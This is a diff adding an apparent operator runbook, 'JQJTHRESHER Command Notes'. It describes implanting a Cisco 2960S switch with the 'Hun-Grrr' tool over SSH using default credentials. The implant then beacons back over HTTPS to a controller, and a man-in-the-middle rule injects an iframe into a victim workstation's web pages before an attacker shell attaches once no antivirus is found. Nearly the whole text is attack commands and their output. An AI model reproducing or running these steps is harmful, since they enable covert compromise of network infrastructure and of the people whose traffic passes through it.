@@ -1,0 +1,92 @@
+
+                        Owner: User #14587667
+JQJTHRESHER Command Notes
+Step 1: Implant 2960S with Hun-Grrr
+ICON IP Address: 172.20.12.22
+Hun-Grrr Location: /home/ubuntu/ops/aquaman/aquaman-5h/hg
+Throw Hunger (ICON)
+
+$ sudo -sH
+# cd /home/ubuntu/ops/aquaman/aquaman-5h/attack/linux
+# ./sshiac --ip 172.31.255.14:22 --l cisco:cisco password               //Install IAC
+Output: 
+LGEC -125DHEC -60
+EC -159M
+# cd ../../remote
+Confirm output of target-aliases (see attached file)
+# source aliases
+[target:172.31.255.14] remote> broad
+[target:172.31.255.14] remote> ./seq set 1
+[target:172.31.255.14] remote> broad
+[target:172.31.255.14] remote> vi target-aliases
+Replace the Proc ID value with the Proc ID returned from the broad command
+In another window, edit /home/ubuntu/ops/aquaman/aquaman-5h/remote/data/config/npc3/target.py and change the delay value to 0.
+[target:172.31.255.14] remote> hg_start
+[target:172.31.255.14] remote> yes
+Output: 
+... 
+ 0x0452b10c - chunk 514 99%
+########## - done
+ ----------------------------------------------------------------------------
+Sending sequence -->518<-- command is 40 bytes to procid 0x1722141fSending UDP/bounce from port 38911 to port 53----------------------------------------------------------------------------GOOD - status OK.OP: RUNCODE using Per Second Code address: 0x044add2c No data Result: 0x00000001----------------------------------------------------------------------------
+NOTE: Memory malloced (address 0x044add24) was not freed automatically Do NOT free it unless you really know what you are doing
+----------------------------------------------------------------------------Sending sequence -->519<-- command is 24 bytes to procid 0x1722141fSending UDP/bounce from port 50192 to port 53----------------------------------------------------------------------------GOOD - status OK.OP: DEINSTALL----------------------------------------------------------------------------
+You have successfully exploited using IAC!
+
+Listen Window (ICON)
+
+$ sudo -sH
+# cd /home/ubuntu/ops/aquaman/aquaman-5h/hg
+[target:172.31.255.14] hg> ./cutthroat ilm_hg.so
+> ilm listen aquaman-5h.txt
+
+Trigger Window (ICON)
+
+$ sudo -sH
+# cd /home/ubuntu/ops/aquaman/aquaman-5h/hg
+# ./cutthroat ilm_hg.so
+> ilm trigger aquaman-5h.txt
+[192.168.21.10]> beacon call_me_back https 443 -ii 192.168.21.10
+ 
+
+ 
+Files
+aquaman-5h.txt
+target-aliases.txt
+Step 2: 
+(From ICON on Listen Window)
+[192.168.21.10]> mitm show
+= No Rules Found / Success
+>mitm create http_iframe 192.168.21.11 255.255.255.0 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -en -bc -bk
+= Success
+>mitm status
+= Success, 1 enabled rule
+(From Victim XPWindows operating system (Version) workstation)
+Browse to public IP'd website (www.google.com) in Internet Explorer
+= Verify iframe injection on the source code of the webpage in IE
+(From Windex ShellTerm window)
+> attach 419   (419 is based on sessid that connects)
+= "No PSPPersonal Security Product (Anti-Virus) Products Detected! Weapons free!"....
+ 
+ 
+
+Attachments:
+
+
+target-aliases.txt
+
+
+aquaman-5h.txt
+
+
+aquaman-5h.txt.txt
+
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+|
+                    
